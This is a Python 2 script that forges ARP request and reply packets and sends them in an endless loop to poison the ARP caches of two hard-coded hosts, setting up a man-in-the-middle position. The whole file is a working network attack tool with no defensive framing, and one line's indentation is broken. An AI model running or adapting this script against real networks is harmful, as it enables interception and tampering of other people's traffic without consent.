#import net_helper_ipv6
import net_helper
import binascii
import socket
import uuid


def get_my_mac():
    mac_str = hex(uuid.getnode())[2:-1]
    corrected = '0'*(12-len(mac_str)) + mac_str
    return binascii.unhexlify(corrected)

def mac_str_to_bin(mstr):
  return binascii.unhexlify(mstr.replace(':',''))

def ipv6_str_to_bin(addr):
    return socket.inet_pton(socket.AF_INET6, addr)


## POISON FOR LINUX BOX
def send_arp_req(destmac, srcip, destip):

  eth_hdr  =  mac_str_to_bin(destmac) #dest hw addr
  eth_hdr  += get_my_mac()            #src hw addr 
  eth_hdr  += "\x08\x06"              #ether msg type

  arpreq = "\x00\x01"  # hw type
  arpreq += "\x08\x00" # protocol type (ethernet)
  arpreq += "\x06"     # length of hw addr (6 bytes)
  arpreq += "\x04"     # length of the ip addr
  arpreq += "\x00\01"  # operation code 
  arpreq += get_my_mac() # src mac
  arpreq += socket.inet_aton(srcip)       # src ip
  arpreq += "\x00" * 6		          # dest mac
  arpreq += socket.inet_aton(destip)      # dest ip

  net_helper.rawsend(eth_hdr + arpreq, dev="eth0")


## POISON FOR WINDOWS BOX
def send_arp_reply(destmac, srcip, destip):

  eth_hdr  =  mac_str_to_bin(destmac) #dest hw addr
  eth_hdr  += get_my_mac()            #src hw addr 
  eth_hdr  += "\x08\x06"              #ether msg type

  arpreq = "\x00\x01"    # hw type
  arpreq += "\x08\x00"   # protocol type (ethernet)
  arpreq += "\x06"       # length of hw addr (6 bytes)
  arpreq += "\x04"       # length of the ip addr
  arpreq += "\x00\02"    # operation code 
  arpreq += get_my_mac() # src mac
  arpreq += socket.inet_aton(srcip)       # src ip
  arpreq += "\x00" * 6			  # dest mac
  arpreq += socket.inet_aton(destip)      # dest ip

 net_helper.rawsend(eth_hdr + arpreq, dev="eth0")

## ARP POISON
## REORDER BASED ON TARGET OS's
def arp_poison(mac_target1, ip_target_1, mac_target2, ip_target2):
  print "sending"
  while 1:
    send_arp_reply(mac_target1, ip_target2, ip_target_1)
    send_arp_req(mac_target2, ip_target_1, ip_target2)




####### MAIN #######

#send_arp_req("ff:ff:ff:ff:ff:ff","172.16.0.217", "172.16.0.37")

arp_poison("00:0c:29:47:32:8f", "172.16.0.37", "00:0c:29:75:eb:a5", "172.16.0.186")

